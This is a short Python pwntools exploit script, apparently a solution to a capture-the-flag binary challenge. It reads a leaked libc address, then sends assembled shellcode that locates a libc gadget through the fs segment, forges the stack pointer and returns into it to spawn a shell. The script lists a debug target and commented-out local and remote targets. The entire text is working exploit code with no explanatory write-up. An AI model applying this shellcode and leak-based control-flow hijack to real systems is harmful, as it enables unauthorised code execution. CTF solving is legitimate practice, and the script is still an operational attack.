#!/usr/bin/env python3

from pwn import *

context(os='linux', arch='amd64', log_level='error')
context.terminal = ['tmux', 'splitw', '-h']
exe = ELF("./the_absolute_horror_of_the_trip_patched")
libc = ELF("libc.so.6")
# ld = ELF("ld-linux-x86-64.so.2")
context.binary = exe

io = gdb.debug(exe.path, 'init-pwndbg\nbreak exec')
# io = process(exe.path)
# io = remote('127.0.0.1', 1369)
# io = remote('172.210.129.230', 1369)
code = f'''
    mov r13, [fs:0]
    sub r13, 0x1e3680
    add r13, 0xdabb3
    mov rbp, 0x6969696500
    mov rsp, 0x6969696500
    push r13
    mov rdi, 0
    ret
'''
# pause()
base = int(io.recvline().strip(b'okey you think you can handle a bad trip? *gives you DPH* ').decode(), 16)-libc.sym.puts
print(hex(base))
io.sendlineafter(b'>> ', asm(code))
io.interactive()
